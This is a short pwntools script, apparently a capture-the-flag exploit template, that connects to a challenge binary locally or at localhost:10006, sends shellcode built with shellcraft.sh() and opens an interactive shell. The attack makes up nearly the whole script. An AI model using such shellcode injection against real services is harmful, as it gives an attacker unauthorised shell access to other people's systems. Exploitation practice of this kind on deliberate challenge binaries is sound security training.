#!/usr/bin/env python3

from pwn import *

exe = context.binary = ELF("./chall", checksec=False)
# libc = ELF("", checksec=False)
# ld = ELF("", checksec=False)
context.terminal = ['tmux', 'splitw', '-h']

def conn():
    if args.GDB:
        print("DEBUG")
        r = process([exe.path])
        gdb.attach(r, gdbscript=gdbscript)
    elif args.REMOTE:
        r = remote("localhost", 10006)
    else:
        r = process([exe.path])

    return r

gdbscript="""
"""

#======================== EXPLOIT HERE ========================#

r = conn()

pay = asm(shellcraft.sh())

r.sendline(pay)

r.interactive()